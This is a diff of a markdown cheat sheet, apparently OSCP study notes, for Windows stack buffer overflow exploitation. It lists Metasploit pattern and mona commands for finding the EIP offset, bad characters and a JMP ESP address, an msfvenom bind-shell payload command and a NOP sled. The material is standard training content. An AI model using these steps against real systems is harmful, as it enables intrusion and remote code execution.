@@ -9,11 +9,23 @@ A * 30000
 
 ## 2 - Find EIP using pattern (-q EIP address)
 
+Generate pattern
 ```
-/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 > ~/Desktop/mp3_bufferoverflow_pattern.txt
+!mona pattern_create 30000
 ```
 ```
-/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 48386B48 -l 30000
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 30000 > bufferoverflow_pattern.txt
+```
+
+Search for pattern
+```
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q <EIP address> -l 30000
+```
+```
+!mona findmsp
+```
+```
+!mona pattern_offset <EIP address>
 ```
 
 ## 3 - Find bad char
@@ -25,12 +37,12 @@ A * 30000
 !mona compare -f C:\logs\<app>\bytearray.bin -a 000FF730
 ```
 
-## 4 - Find JMP ESP
+## 4 - Find JMP ESP (this in case shellcode is in ESP) 
 - Address cannot have bad char
 - Consider MSVCP60.dll and kernetl32.dll
 
 ```
-!mona jump -r ESP
+!mona jmp -r ESP
 ```
 
 ## 5 - Create shell code without bad char
@@ -49,3 +61,12 @@ msfvenom -a x86 --platform windows -p windows/shell_bind_tcp LPORT=4444 -e x86/a
 ```
 buffer += b'\x90' * 10
 ```
+
+## 7 - Run exploit
+
+Excute the exploit
+
+
+## Links
+ - [OSCP Stack Based Buffer Overflow Cheat Sheet](https://nop-blog.tech/oscp/bof-cheatsheet/)
+ - [Msfvenom All in One cheatsheet](https://blog.certcube.com/oscp-msfvenom-all-in-one-cheatsheet/)
